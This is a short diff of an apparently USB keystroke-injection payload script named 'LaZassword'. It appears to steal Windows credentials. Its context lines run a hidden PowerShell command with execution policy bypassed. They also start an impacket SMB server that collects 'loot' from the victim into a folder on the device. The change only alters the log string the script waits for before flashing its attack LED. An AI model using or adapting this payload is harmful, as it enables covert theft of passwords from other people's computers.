@@ -62,7 +62,7 @@ RUN WIN "PowerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_vo
 python /tools/impacket/examples/smbserver.py -smb2support LaZassword /root/udisk/loot/LaZassword/$lootfolder >> /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt &
 
 # Wait for the signal
-while ! grep -wq "Handle" /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt
+while ! grep -wq "Incoming" /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt
 do
 LED ATTACK
 sleep 1
